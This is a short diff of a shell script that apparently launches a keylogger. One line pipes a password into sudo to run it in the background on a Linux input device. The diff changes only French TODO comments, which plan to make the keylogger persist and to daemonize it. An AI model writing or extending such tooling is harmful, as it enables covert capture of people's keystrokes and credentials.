@@ -31,4 +31,5 @@ echo -e $password | sudo -S -b ./keylogger "/dev/input/$eventfile" "${keyMap}" &
 echo $?
 #TODO loop on $? for retry
 #TODO completer le PARSEUR
-#TODO ajouter un systeme de persistence du keylogger  
+#TODO ajouter un systeme de persistence du keylogger
+#TODO deamonize process
